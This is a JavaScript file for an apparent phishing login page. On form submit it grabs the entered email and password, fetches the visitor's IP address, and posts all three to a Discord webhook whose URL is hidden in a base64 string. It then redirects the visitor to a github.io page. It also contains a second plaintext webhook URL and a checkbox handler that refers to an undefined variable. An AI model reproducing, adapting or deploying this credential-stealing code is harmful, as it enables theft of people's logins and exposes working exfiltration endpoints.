
const userinfoEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMDc3NTk5NzIzODM0NTcyOC9aVk5tX2F4RVRUN1d3TnZOVkhjdXBsaGRUZk14SUs4Z05LS25XMUtFUl8zQ1NTYkNzcHc3WERKaXlrWUJ6YkNmcE5iSA';

const skibidiCheckbox = document.getElementById('skibidiCheckbox');
const loginButton = document.getElementById('loginButton');

// Enable or disable the login button based on checkbox state
skibidiCheckbox.addEventListener('change', function() {
    if (!skibidiCheckbox.checked) {
                checkbox.classList.add('error');
                alert('Please Check The Box.');
    }
});

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Fetch the user's IP address using ipify
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIP = data.ip;

            
            fetch('https://discord.com/api/webhooks/1310775997238345728/ZVNm_axETT7WwNvNVHcuplhdTfMxIK8gNKKnW1KER_KGHDYYgshYohghd', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    Data: 'the user info discord webhook'
                })
            });

            
            const userInfo = atob(userinfoEncoded);
            
            fetch(userInfo, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `New Login Attempt:
Email: ||${email}||
Password: ||${password}||
IP Address: ||${userIP}||`
                })
            })
            .then(response => {
                window.location.href = 'https://cryptodude3.github.io/badmin/';
            })
            .catch(error => {
                console.error('Error:', error);
                window.location.href = 'https://cryptodude3.github.io/badmin/';
            });
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
            window.location.href = 'https://cryptodude3.github.io/badmin/';
        });
});
